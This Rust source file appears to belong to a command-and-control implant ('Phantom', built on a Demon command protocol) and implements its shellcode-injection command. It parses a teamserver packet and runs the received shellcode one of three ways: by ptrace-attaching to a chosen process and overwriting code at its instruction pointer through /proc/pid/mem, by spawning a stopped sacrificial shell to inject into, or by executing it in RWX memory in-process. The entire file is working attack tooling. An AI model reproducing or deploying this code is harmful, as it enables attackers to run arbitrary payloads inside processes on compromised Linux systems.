use std::fs;
use std::io::Write;
use std::process::Stdio;

use red_cell_common::demon::DemonCommand;
use tokio::process::Command;

use crate::command::PhantomState;
use crate::command::encode::encode_u32;
use crate::command::types::PendingCallback;
use crate::error::PhantomError;
use crate::parser::TaskParser;

use super::ptrace::check_ptrace_permission;
use super::{
    INJECT_ERROR_FAILED, INJECT_ERROR_SUCCESS, INJECT_WAY_EXECUTE, INJECT_WAY_INJECT,
    INJECT_WAY_SPAWN,
};

/// Handle `CommandInjectShellcode` (ID 24): inject raw shellcode into a process.
///
/// ## Packet format (from teamserver, little-endian)
///
/// | Field      | Type   | Description                                      |
/// |------------|--------|--------------------------------------------------|
/// | way        | i32    | 0 = spawn, 1 = inject (by PID), 2 = execute self |
/// | technique  | i32    | Thread creation method (ignored on Linux)         |
/// | x64        | i32    | Architecture flag (ignored on Linux)              |
/// | shellcode  | bytes  | `[len:i32][data]` — the shellcode payload         |
/// | argument   | bytes  | `[len:i32][data]` — optional arguments            |
/// | pid        | i32    | Target PID (only meaningful for way=1)            |
///
/// ## Response (big-endian)
///
/// `[status:u32]` — 0 = success, 1 = failure.
pub(super) async fn execute_inject_shellcode(
    request_id: u32,
    payload: &[u8],
    state: &mut PhantomState,
) -> Result<(), PhantomError> {
    let mut parser = TaskParser::new(payload);
    let way = parser.int32()?;
    let _technique = parser.int32()?; // Windows thread creation method — ignored on Linux
    let _x64 = parser.int32()?; // Architecture flag — ignored on Linux (native arch)
    let shellcode = parser.bytes()?.to_vec();
    let _argument = parser.bytes()?.to_vec();
    let pid = parser.int32().unwrap_or(0); // PID may be absent for spawn/execute

    tracing::debug!(way, shellcode_len = shellcode.len(), pid, "inject shellcode");

    let status = match way {
        INJECT_WAY_INJECT => inject_shellcode_into_pid(pid as u32, &shellcode).await,
        INJECT_WAY_SPAWN => inject_shellcode_spawn(&shellcode).await,
        INJECT_WAY_EXECUTE => inject_shellcode_execute(&shellcode),
        _ => {
            tracing::warn!(way, "unknown injection way");
            INJECT_ERROR_FAILED
        }
    };

    state.queue_callback(PendingCallback::Structured {
        command_id: u32::from(DemonCommand::CommandInjectShellcode),
        request_id,
        payload: encode_u32(status),
    });

    Ok(())
}

/// Inject shellcode into an existing process using `/proc/<pid>/mem`.
///
/// 1. Attach via `ptrace(PTRACE_ATTACH)`.
/// 2. Read the current RIP from registers.
/// 3. Write shellcode at RIP via `/proc/<pid>/mem`.
/// 4. Detach with `ptrace(PTRACE_DETACH)` so the tracee resumes at the
///    overwritten instruction pointer.
async fn inject_shellcode_into_pid(pid: u32, shellcode: &[u8]) -> u32 {
    use std::io::{Seek, SeekFrom};

    if shellcode.is_empty() {
        tracing::warn!("empty shellcode payload");
        return INJECT_ERROR_FAILED;
    }

    let pid_i32 = pid as i32;

    if !check_ptrace_permission(pid) {
        tracing::warn!(pid, "ptrace not permitted (check /proc/sys/kernel/yama/ptrace_scope)");
        return INJECT_ERROR_FAILED;
    }

    // SAFETY: ptrace with PTRACE_ATTACH on a valid PID. We check the return value.
    let ret = unsafe { libc::ptrace(libc::PTRACE_ATTACH, pid_i32, 0, 0) };
    if ret < 0 {
        tracing::warn!(pid, "ptrace ATTACH failed: {}", std::io::Error::last_os_error());
        return INJECT_ERROR_FAILED;
    }

    let mut wait_status: i32 = 0;
    // SAFETY: waitpid with valid PID and status pointer.
    unsafe { libc::waitpid(pid_i32, &mut wait_status, 0) };

    let mut regs: libc::user_regs_struct = unsafe { std::mem::zeroed() };
    // SAFETY: PTRACE_GETREGS with valid pid and pointer to regs struct.
    let ret = unsafe {
        libc::ptrace(libc::PTRACE_GETREGS, pid_i32, 0, &mut regs as *mut libc::user_regs_struct)
    };
    if ret < 0 {
        tracing::warn!(pid, "ptrace GETREGS failed: {}", std::io::Error::last_os_error());
        // SAFETY: detach from the tracee to avoid leaving it stopped.
        unsafe { libc::ptrace(libc::PTRACE_DETACH, pid_i32, 0, 0) };
        return INJECT_ERROR_FAILED;
    }

    let inject_addr = regs.rip;
    let mem_path = format!("/proc/{pid}/mem");
    let result = (|| -> std::io::Result<()> {
        let mut file = fs::OpenOptions::new().write(true).open(&mem_path)?;
        file.seek(SeekFrom::Start(inject_addr))?;
        file.write_all(shellcode)?;
        Ok(())
    })();

    if let Err(e) = result {
        tracing::warn!(pid, %e, "failed to write shellcode via /proc/pid/mem");
        // SAFETY: detach from the tracee.
        unsafe { libc::ptrace(libc::PTRACE_DETACH, pid_i32, 0, 0) };
        return INJECT_ERROR_FAILED;
    }

    // SAFETY: PTRACE_DETACH with valid pid.
    unsafe { libc::ptrace(libc::PTRACE_DETACH, pid_i32, 0, 0) };

    tracing::info!(pid, inject_addr, shellcode_len = shellcode.len(), "shellcode injected");
    INJECT_ERROR_SUCCESS
}

/// Spawn a sacrificial child process and inject shellcode into it.
///
/// Forks a child that immediately stops itself (`SIGSTOP`), then uses the
/// same `/proc/<pid>/mem` technique to overwrite its entry point with the
/// shellcode before resuming it.
async fn inject_shellcode_spawn(shellcode: &[u8]) -> u32 {
    if shellcode.is_empty() {
        tracing::warn!("empty shellcode payload");
        return INJECT_ERROR_FAILED;
    }

    let child = match Command::new("/bin/sh")
        .args(["-c", "kill -STOP $$ ; exec sleep infinity"])
        .stdin(Stdio::null())
        .stdout(Stdio::null())
        .stderr(Stdio::null())
        .spawn()
    {
        Ok(c) => c,
        Err(e) => {
            tracing::warn!(%e, "failed to spawn sacrificial process");
            return INJECT_ERROR_FAILED;
        }
    };

    let Some(child_pid) = child.id() else {
        tracing::warn!("failed to get child PID");
        return INJECT_ERROR_FAILED;
    };

    inject_shellcode_into_pid(child_pid, shellcode).await
}

/// Execute shellcode in the current process using an anonymous mmap region.
///
/// Allocates RWX memory via `mmap`, copies the shellcode, and calls it as a
/// function pointer on a new thread (so the agent main thread is not blocked).
fn inject_shellcode_execute(shellcode: &[u8]) -> u32 {
    if shellcode.is_empty() {
        tracing::warn!("empty shellcode payload");
        return INJECT_ERROR_FAILED;
    }

    let len = shellcode.len();

    // SAFETY: mmap with MAP_ANONYMOUS | MAP_PRIVATE, no file descriptor.
    let addr = unsafe {
        libc::mmap(
            std::ptr::null_mut(),
            len,
            libc::PROT_READ | libc::PROT_WRITE | libc::PROT_EXEC,
            libc::MAP_ANONYMOUS | libc::MAP_PRIVATE,
            -1,
            0,
        )
    };
    if addr == libc::MAP_FAILED {
        tracing::warn!("mmap failed: {}", std::io::Error::last_os_error());
        return INJECT_ERROR_FAILED;
    }

    // SAFETY: addr is a valid mmap'd region of `len` bytes.
    unsafe {
        std::ptr::copy_nonoverlapping(shellcode.as_ptr(), addr as *mut u8, len);
    }

    let func_ptr = addr as usize;
    let map_len = len;
    std::thread::spawn(move || {
        // SAFETY: the caller guarantees the shellcode is valid executable code.
        unsafe {
            let func: extern "C" fn() = std::mem::transmute(func_ptr);
            func();
            libc::munmap(func_ptr as *mut libc::c_void, map_len);
        }
    });

    tracing::info!(shellcode_len = len, "shellcode executing in-process");
    INJECT_ERROR_SUCCESS
}
